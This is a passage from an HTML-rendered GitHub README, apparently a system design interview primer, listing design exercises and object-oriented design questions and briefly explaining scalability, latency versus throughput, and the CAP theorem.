&lt;h3&gt;&lt;a id="user-content-design-a-web-crawler" class="anchor" aria-hidden="true" href="#design-a-web-crawler"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design a web crawler&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/web_crawler/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/ba21a95852d1cf7bb64c8c4622a79d1d5a20d344/687474703a2f2f692e696d6775722e636f6d2f625778507451412e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/ba21a95852d1cf7bb64c8c4622a79d1d5a20d344/687474703a2f2f692e696d6775722e636f6d2f625778507451412e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/bWxPtQA.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-mintcom" class="anchor" aria-hidden="true" href="#design-mintcom"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design Mint.com&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/mint/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/12fea5f9324f74189a9cd983b02239c68615b67e/687474703a2f2f692e696d6775722e636f6d2f563571353776552e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/12fea5f9324f74189a9cd983b02239c68615b67e/687474703a2f2f692e696d6775722e636f6d2f563571353776552e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/V5q57vU.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-the-data-structures-for-a-social-network" class="anchor" aria-hidden="true" href="#design-the-data-structures-for-a-social-network"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design the data structures for a social network&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/social_graph/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/16d78e51c2e2949e23122f4c26afe5886f82a96f/687474703a2f2f692e696d6775722e636f6d2f636443763567372e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/16d78e51c2e2949e23122f4c26afe5886f82a96f/687474703a2f2f692e696d6775722e636f6d2f636443763567372e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/cdCv5g7.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-a-key-value-store-for-a-search-engine" class="anchor" aria-hidden="true" href="#design-a-key-value-store-for-a-search-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design a key-value store for a search engine&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/query_cache/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/b6439861687b9a0fc62d0149a364082643ebaf86/687474703a2f2f692e696d6775722e636f6d2f346a39396d68652e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/b6439861687b9a0fc62d0149a364082643ebaf86/687474703a2f2f692e696d6775722e636f6d2f346a39396d68652e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/4j99mhe.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-amazons-sales-ranking-by-category-feature" class="anchor" aria-hidden="true" href="#design-amazons-sales-ranking-by-category-feature"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design Amazon's sales ranking by category feature&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/sales_rank/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/a56f5600f7ae29dc0c2e436b8e4e4b55c44d6894/687474703a2f2f692e696d6775722e636f6d2f4d7a45785030362e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/a56f5600f7ae29dc0c2e436b8e4e4b55c44d6894/687474703a2f2f692e696d6775722e636f6d2f4d7a45785030362e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/MzExP06.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-a-system-that-scales-to-millions-of-users-on-aws" class="anchor" aria-hidden="true" href="#design-a-system-that-scales-to-millions-of-users-on-aws"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design a system that scales to millions of users on AWS&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/scaling_aws/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/e45e39c36eebcc4c66e1aecd4e4145112d8e88e3/687474703a2f2f692e696d6775722e636f6d2f6a6a3341354e382e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/e45e39c36eebcc4c66e1aecd4e4145112d8e88e3/687474703a2f2f692e696d6775722e636f6d2f6a6a3341354e382e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/jj3A5N8.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-object-oriented-design-interview-questions-with-solutions" class="anchor" aria-hidden="true" href="#object-oriented-design-interview-questions-with-solutions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Object-oriented design interview questions with solutions&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Common object-oriented design interview questions with sample discussions, code, and diagrams.&lt;/p&gt;
&lt;p&gt;Solutions linked to content in the &lt;code&gt;solutions/&lt;/code&gt; folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note: This section is under development&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Question&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Design a hash map&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/hash_table/hash_map.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a least recently used cache&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/lru_cache/lru_cache.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a call center&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/call_center/call_center.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a deck of cards&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/deck_of_cards/deck_of_cards.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a parking lot&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/parking_lot/parking_lot.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a chat server&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/object_oriented_design/online_chat/online_chat.ipynb"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a circular array&lt;/td&gt;
&lt;td&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Add an object-oriented design question&lt;/td&gt;
&lt;td&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-system-design-topics-start-here" class="anchor" aria-hidden="true" href="#system-design-topics-start-here"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;System design topics: start here&lt;/h2&gt;
&lt;p&gt;New to system design?&lt;/p&gt;
&lt;p&gt;First, you'll need a basic understanding of common principles, learning about what they are, how they are used, and their pros and cons.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-step-1-review-the-scalability-video-lecture" class="anchor" aria-hidden="true" href="#step-1-review-the-scalability-video-lecture"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 1: Review the scalability video lecture&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=-W9F__D3oY4" rel="nofollow"&gt;Scalability Lecture at Harvard&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Topics covered:
&lt;ul&gt;
&lt;li&gt;Vertical scaling&lt;/li&gt;
&lt;li&gt;Horizontal scaling&lt;/li&gt;
&lt;li&gt;Caching&lt;/li&gt;
&lt;li&gt;Load balancing&lt;/li&gt;
&lt;li&gt;Database replication&lt;/li&gt;
&lt;li&gt;Database partitioning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-step-2-review-the-scalability-article" class="anchor" aria-hidden="true" href="#step-2-review-the-scalability-article"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 2: Review the scalability article&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.lecloud.net/tagged/scalability/chrono" rel="nofollow"&gt;Scalability&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Topics covered:
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones" rel="nofollow"&gt;Clones&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database" rel="nofollow"&gt;Databases&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache" rel="nofollow"&gt;Caches&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/9699762917/scalability-for-dummies-part-4-asynchronism" rel="nofollow"&gt;Asynchronism&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-next-steps" class="anchor" aria-hidden="true" href="#next-steps"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Next steps&lt;/h3&gt;
&lt;p&gt;Next, we'll look at high-level trade-offs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Performance&lt;/strong&gt; vs &lt;strong&gt;scalability&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Latency&lt;/strong&gt; vs &lt;strong&gt;throughput&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt; vs &lt;strong&gt;consistency&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Keep in mind that &lt;strong&gt;everything is a trade-off&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Then we'll dive into more specific topics such as DNS, CDNs, and load balancers.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-performance-vs-scalability" class="anchor" aria-hidden="true" href="#performance-vs-scalability"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Performance vs scalability&lt;/h2&gt;
&lt;p&gt;A service is &lt;strong&gt;scalable&lt;/strong&gt; if it results in increased &lt;strong&gt;performance&lt;/strong&gt; in a manner proportional to resources added. Generally, increasing performance means serving more units of work, but it can also be to handle larger units of work, such as when datasets grow.&lt;sup&gt;&lt;a href="http://www.allthingsdistributed.com/2006/03/a_word_on_scalability.html" rel="nofollow"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;Another way to look at performance vs scalability:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you have a &lt;strong&gt;performance&lt;/strong&gt; problem, your system is slow for a single user.&lt;/li&gt;
&lt;li&gt;If you have a &lt;strong&gt;scalability&lt;/strong&gt; problem, your system is fast for a single user but slow under heavy load.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-1" class="anchor" aria-hidden="true" href="#sources-and-further-reading-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.allthingsdistributed.com/2006/03/a_word_on_scalability.html" rel="nofollow"&gt;A word on scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-latency-vs-throughput" class="anchor" aria-hidden="true" href="#latency-vs-throughput"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Latency vs throughput&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Latency&lt;/strong&gt; is the time to perform some action or to produce some result.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Throughput&lt;/strong&gt; is the number of such actions or results per unit of time.&lt;/p&gt;
&lt;p&gt;Generally, you should aim for &lt;strong&gt;maximal throughput&lt;/strong&gt; with &lt;strong&gt;acceptable latency&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-2" class="anchor" aria-hidden="true" href="#sources-and-further-reading-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://community.cadence.com/cadence_blogs_8/b/sd/archive/2010/09/13/understanding-latency-vs-throughput" rel="nofollow"&gt;Understanding latency vs throughput&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-availability-vs-consistency" class="anchor" aria-hidden="true" href="#availability-vs-consistency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Availability vs consistency&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-cap-theorem" class="anchor" aria-hidden="true" href="#cap-theorem"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CAP theorem&lt;/h3&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/13719354da7dcd34cd79ff5f8b6306a67bc18261/687474703a2f2f692e696d6775722e636f6d2f62674c4d4932752e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/13719354da7dcd34cd79ff5f8b6306a67bc18261/687474703a2f2f692e696d6775722e636f6d2f62674c4d4932752e706e67" data-canonical-src="http://i.imgur.com/bgLMI2u.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://robertgreiner.com/2014/08/cap-theorem-revisited" rel="nofollow"&gt;Source: CAP theorem revisited&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;In a distributed computer system, you can only support two of the following guarantees:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - Every read receives the most recent write or an error&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt; - Every request receives a response, without guarantee that it contains the most recent version of the information&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Partition Tolerance&lt;/strong&gt; - The system continues to operate despite arbitrary partitioning due to network failures&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;Networks aren't reliable, so you'll need to support partition tolerance.  You'll need to make a software tradeoff between consistency and availability.&lt;/em&gt;&lt;/p&gt;
